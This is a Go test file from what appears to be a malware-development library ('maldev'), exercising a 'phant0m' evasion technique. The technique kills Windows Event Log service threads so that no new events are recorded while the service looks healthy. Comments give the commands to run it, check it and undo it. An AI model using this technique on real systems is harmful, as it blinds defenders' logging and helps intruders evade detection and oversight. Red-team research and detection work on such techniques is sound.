//go:build windows

package phant0m

import (
	"context"
	"errors"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/testutil"
)

func TestTechnique_ImplementsInterface(t *testing.T) {
	var _ evasion.Technique = Technique()
}

// TestKillEventLogThreads terminates Event Log service threads.
//
// PREREQUISITES:
//   - Run as Administrator
//   - Run in a VM (not on your dev machine)
//   - Event Log service must be running: sc query EventLog
//
// USAGE:
//
//	MALDEV_MANUAL=1 MALDEV_INTRUSIVE=1 go test ./evasion/phant0m/ -run TestKillEventLogThreads -v
//
// VERIFY:
//
//	After test: wevtutil qe Security /c:1 should fail or return stale events.
//	The Event Log service will appear running but will not write new events.
//
// CLEANUP:
//
//	Restart the Event Log service: net stop EventLog && net start EventLog
//	Or restart the VM.
func TestKillEventLogThreads(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)

	err := Kill(nil)
	if errors.Is(err, ErrNoTargetThreads) {
		t.Skip("no EventLog threads with service tags on this VM — tag resolution may not be available")
	}
	require.NoError(t, err)
	t.Log("Event Log service threads terminated; event logging is now silenced")
}

// TestHeartbeat_RejectsNonPositiveInterval is a unit-only check
// (no privilege, no real Kill). The function must reject zero or
// negative intervals before attempting any side effect.
func TestHeartbeat_RejectsNonPositiveInterval(t *testing.T) {
	for _, interval := range []time.Duration{0, -1, -time.Second} {
		err := Heartbeat(context.Background(), interval, nil)
		if err == nil {
			t.Fatalf("Heartbeat(%s) err = nil, want non-nil", interval)
		}
	}
}

// TestHeartbeat_RespectsContextCancellation requires SeDebugPrivilege
// and a running Event Log service — same gate as TestKillEventLogThreads.
// Confirms that:
//   - the first Kill ran (no error from Heartbeat)
//   - cancelling the context returns ctx.Err()
func TestHeartbeat_RespectsContextCancellation(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)

	ctx, cancel := context.WithTimeout(context.Background(), 250*time.Millisecond)
	defer cancel()
	err := Heartbeat(ctx, 100*time.Millisecond, nil)
	if errors.Is(err, ErrNoTargetThreads) {
		t.Skip("no EventLog threads with service tags on this VM — tag resolution may not be available")
	}
	if !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("Heartbeat err = %v, want DeadlineExceeded", err)
	}
}
